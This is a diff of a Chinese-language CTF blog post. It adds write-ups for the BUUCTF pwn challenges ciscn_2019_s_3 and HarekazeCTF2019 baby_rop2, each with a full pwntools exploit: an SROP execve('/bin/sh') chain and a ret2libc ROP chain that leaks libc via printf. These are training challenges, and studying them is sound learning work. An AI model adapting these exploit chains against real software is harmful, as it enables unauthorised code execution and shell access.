@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="bjdctf_2020_babyrop2查看保护  开启看canary和nx，堆栈不可执行，canary检查溢出 main函数  init函数  gift函数  可以看到有明显的格式化字符串漏洞。 vuln函数  看到有栈溢出。 ​    主要思路就是，先通过格式化字符串漏洞泄露canary，再通过put函数泄露libc，再次溢出到system函数。 先看一下格式化字符串漏洞 先要计算格式化字符串">
+<meta name="description" content="#1 bjdctf_2020_babyrop2查看保护  开启看canary和nx，堆栈不可执行，canary检查溢出 main函数  init函数  gift函数  可以看到有明显的格式化字符串漏洞。 vuln函数  看到有栈溢出。 ​    主要思路就是，先通过格式化字符串漏洞泄露canary，再通过put函数泄露libc，再次溢出到system函数。 先看一下格式化字符串漏洞 先要计算格式化">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buu">
 <meta property="og:url" content="https://caiii-vegtable.github.io/2020/07/20/buu/index.html">
 <meta property="og:site_name" content="inHaus&#39;blog">
-<meta property="og:description" content="bjdctf_2020_babyrop2查看保护  开启看canary和nx，堆栈不可执行，canary检查溢出 main函数  init函数  gift函数  可以看到有明显的格式化字符串漏洞。 vuln函数  看到有栈溢出。 ​    主要思路就是，先通过格式化字符串漏洞泄露canary，再通过put函数泄露libc，再次溢出到system函数。 先看一下格式化字符串漏洞 先要计算格式化字符串">
+<meta property="og:description" content="#1 bjdctf_2020_babyrop2查看保护  开启看canary和nx，堆栈不可执行，canary检查溢出 main函数  init函数  gift函数  可以看到有明显的格式化字符串漏洞。 vuln函数  看到有栈溢出。 ​    主要思路就是，先通过格式化字符串漏洞泄露canary，再通过put函数泄露libc，再次溢出到system函数。 先看一下格式化字符串漏洞 先要计算格式化">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/2.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/1.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/init.png">
@@ -135,8 +135,18 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/del-1598423895905.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/dump.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag-1598429299071.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/check-1598512496379.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/vuln-1598512516690.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/g-1598513064633.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/find.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/sub.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/flag-1598513399463.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/check-1598596677457.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/mian.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/gadget.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu/format.png">
 <meta property="article:published_time" content="2020-07-20T01:15:56.000Z">
-<meta property="article:modified_time" content="2020-08-26T08:08:21.659Z">
+<meta property="article:modified_time" content="2020-08-28T07:00:19.951Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/buu/2.png">
@@ -349,7 +359,7 @@
       
 
       
-        <h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>查看保护</p>
+        <h2 id="1-bjdctf-2020-babyrop2"><a href="#1-bjdctf-2020-babyrop2" class="headerlink" title="#1 bjdctf_2020_babyrop2"></a>#1 bjdctf_2020_babyrop2</h2><p>查看保护</p>
 <p><img src="/image/buu/2.png" alt="2"></p>
 <p>开启看canary和nx，堆栈不可执行，canary检查溢出</p>
 <p>main函数</p>
@@ -383,7 +393,7 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag.png" alt="flag"></p>
-<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>check</p>
+<h2 id="2-ciscn-2019-n-3"><a href="#2-ciscn-2019-n-3" class="headerlink" title="#2 ciscn_2019_n_3"></a>#2 ciscn_2019_n_3</h2><p>check</p>
 <p><img src="/image/buu/check.png" alt="check"></p>
 <p>开启了NX和Canary</p>
 <p>main函数是一个菜单</p>
@@ -409,7 +419,7 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag-1597045678391.png" alt="flag"></p>
-<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>check</p>
+<h2 id="3-ciscn-2019-es-2"><a href="#3-ciscn-2019-es-2" class="headerlink" title="#3 ciscn_2019_es_2"></a>#3 ciscn_2019_es_2</h2><p>check</p>
 <p><img src="/image/buu/check-1597130777593.png" alt="check"></p>
 <p>vuln函数</p>
 <p><img src="/image/buu/vuln-1597130791197.png" alt="vuln"></p>
@@ -428,7 +438,7 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag-1597131199054.png" alt="flag"></p>
-<h2 id="zjctf-login"><a href="#zjctf-login" class="headerlink" title="zjctf_login"></a>zjctf_login</h2><p>c++64位程序</p>
+<h2 id="4-zjctf-login"><a href="#4-zjctf-login" class="headerlink" title="#4 zjctf_login"></a>#4 zjctf_login</h2><p>c++64位程序</p>
 <p>checksec</p>
 <p><img src="/image/buu/check-1598251087296.png" alt="check"></p>
 <p>main函数</p>
@@ -459,7 +469,7 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag-1598252049241.png" alt="flag"></p>
-<h2 id="zjctf-easyheap"><a href="#zjctf-easyheap" class="headerlink" title="zjctf_easyheap"></a>zjctf_easyheap</h2><p>堆题</p>
+<h2 id="5-zjctf-easyheap"><a href="#5-zjctf-easyheap" class="headerlink" title="#5 zjctf_easyheap"></a>#5 zjctf_easyheap</h2><p>堆题</p>
 <p>checksec</p>
 <p><img src="/image/buu/check-1598252266361.png" alt="check"></p>
 <p>运行，常见的菜单</p>
@@ -487,7 +497,7 @@
 <p>效果</p>
 <p><img src="/image/buu/cat.png" alt="cat"></p>
 <p>由于buu上没有这个环境所以只能采用第一种。</p>
-<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p>checksec</p>
+<h2 id="6-babyheap-0ctf-2017"><a href="#6-babyheap-0ctf-2017" class="headerlink" title="#6 babyheap_0ctf_2017"></a>#6 babyheap_0ctf_2017</h2><p>checksec</p>
 <p><img src="/image/buu/check-1598423435138.png" alt="check"></p>
 <p>main函数（已修改函数名）</p>
 <p><img src="/image/buu/main-1598423482136.png" alt="main"></p>
@@ -533,6 +543,42 @@
 
 <p>效果</p>
 <p><img src="/image/buu/flag-1598429299071.png" alt="flag"></p>
+<h2 id="7-ciscn-2019-s-3"><a href="#7-ciscn-2019-s-3" class="headerlink" title="#7 ciscn_2019_s_3"></a>#7 ciscn_2019_s_3</h2><p>是srop，参考ctf-wiki</p>
+<p>1、signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。</p>
+<p>2、内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</p>
+<p>3、signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</p>
+<p>当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</p>
+<p>checksec</p>
+<p><img src="/image/buu/check-1598512496379.png" alt="check"></p>
+<p>vuln</p>
+<p><img src="/image/buu/vuln-1598512516690.png" alt="vuln"></p>
+<p>调用read和write</p>
+<p>给了gadget函数</p>
+<p><img src="/image/buu/g-1598513064633.png" alt="g"></p>
+<p>我们还需要/bin/sh，通过read输入</p>
+<p>注意到write打印0x30个字节，前0x20到0x28是一个栈上的地址，可以通过它计算输入的/bin/sh的地址。</p>
+<p>gdb调试 输入aaaa再find aaaa</p>
+<p><img src="/image/buu/find.png" alt="find"></p>
+<p><img src="/image/buu/sub.png" alt="sub"></p>
+<p>计算得偏移为0x188</p>
+<p>利用pwntools的srop工具</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./ciscn_s_3')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25377</span>)</span><br><span class="line">elf=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=elf.arch</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004005a3</span></span><br><span class="line">syscall=<span class="number">0x0000000000400501</span></span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">vuln_addr=<span class="number">0x4004ed</span></span><br><span class="line">sigreturn=<span class="number">0x4004da</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'/bin/sh\x00/bin/sh\x00'</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh=u64(p.recv(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/buu/flag-1598513399463.png" alt="flag"></p>
+<h2 id="8-HarekazeCTF2019-baby-rop2"><a href="#8-HarekazeCTF2019-baby-rop2" class="headerlink" title="#8 [HarekazeCTF2019]baby_rop2"></a>#8 [HarekazeCTF2019]baby_rop2</h2><p>通过printf泄露read函数地址计算libc，构造ROP</p>
+<p>check</p>
+<p><img src="/image/buu/check-1598596677457.png" alt="check"></p>
+<p>main</p>
+<p><img src="/image/buu/mian.png" alt="mian"></p>
+<p>可以看到read的栈溢出</p>
+<p>需要的gadget和格式化字符串的地址</p>
+<p><img src="/image/buu/gadget.png" alt="gadget"></p>
+<p><img src="/image/buu/format.png" alt="format"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./babyrop2')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28809</span>)</span><br><span class="line">elf=ELF(<span class="string">'./babyrop2'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400733</span></span><br><span class="line">pop2=<span class="number">0x0000000000400731</span></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">format_str=<span class="number">0x400770</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop2)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -687,7 +733,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop2"><span class="nav-text">bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-3"><span class="nav-text">ciscn_2019_n_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-text">ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zjctf-login"><span class="nav-text">zjctf_login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zjctf-easyheap"><span class="nav-text">zjctf_easyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap-0ctf-2017"><span class="nav-text">babyheap_0ctf_2017</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-bjdctf-2020-babyrop2"><span class="nav-text">#1 bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ciscn-2019-n-3"><span class="nav-text">#2 ciscn_2019_n_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-ciscn-2019-es-2"><span class="nav-text">#3 ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-zjctf-login"><span class="nav-text">#4 zjctf_login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-zjctf-easyheap"><span class="nav-text">#5 zjctf_easyheap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-babyheap-0ctf-2017"><span class="nav-text">#6 babyheap_0ctf_2017</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-ciscn-2019-s-3"><span class="nav-text">#7 ciscn_2019_s_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-HarekazeCTF2019-baby-rop2"><span class="nav-text">#8 [HarekazeCTF2019]baby_rop2</span></a></li></ol></div>
             
 
           </div>
